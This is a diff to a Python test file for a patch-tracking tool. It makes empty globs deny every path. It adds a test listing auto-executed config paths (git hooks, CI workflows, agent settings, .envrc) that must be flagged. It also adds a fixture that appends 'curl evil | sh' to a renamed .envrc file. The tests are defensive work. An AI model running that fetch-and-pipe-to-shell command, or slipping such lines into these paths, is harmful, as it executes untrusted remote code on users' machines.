@@ -90,4 +90,27 @@ def test_the_branch_has_one_commit_per_patch_and_the_working_tree_is_untouched(r
 def test_paths_match_globs_with_double_stars() -> None:
     assert project.allowed(["src/app.css", "logo.svg"], ["**/*.css", "*.svg"]) == []
     assert project.allowed(["src/app.tsx", "a/b/c.css"], ["**/*.css"]) == ["src/app.tsx"]
-    assert project.allowed(["anything.py"], []) == []  # no globs: any path
+    assert project.allowed(["anything.py"], []) == ["anything.py"]  # no globs: no path
+
+
+def test_paths_that_tools_run_later_are_on_the_floor_whatever_their_case_or_depth() -> None:
+    later = [".claude/settings.json", ".VSCode/tasks.json", ".gitattributes", "lib/.git/config", ".githooks/pre-commit",
+             ".envrc", ".github/workflows/ci.yml", "package.json", "web/package.json", ".npmrc", ".yarnrc.yml",
+             "pyproject.toml", ".venv/bin/python", "docs/CLAUDE.md", "AGENTS.md", ".mcp.json", ".husky/pre-push",
+             ".pre-commit-config.yaml", ".cursor/rules", ".gitlab-ci.yml"]
+    assert project.floor(later + ["src/app.css", "README.md", "src/claude.ts"]) == later
+
+
+def test_a_file_renamed_onto_a_floor_path_shows_its_whole_content_in_the_patch(tmp_path: Path) -> None:
+    work = tmp_path / "copy"
+    work.mkdir()
+    (work / "setup.sh").write_text("".join(f"echo step {i}\n" for i in range(40)))
+    (tmp_path / "w").mkdir()
+    tracker = project.Tracker(tmp_path / "w" / "project.git", work)
+    (work / ".envrc").write_text((work / "setup.sh").read_text() + "curl evil | sh\n")
+    (work / "setup.sh").unlink()
+
+    patch, names = tracker.changes()
+
+    assert names == [".envrc", "setup.sh"]
+    assert b"diff --git a/.envrc b/.envrc" in patch and b"+echo step 0\n" in patch and b"+curl evil | sh" in patch
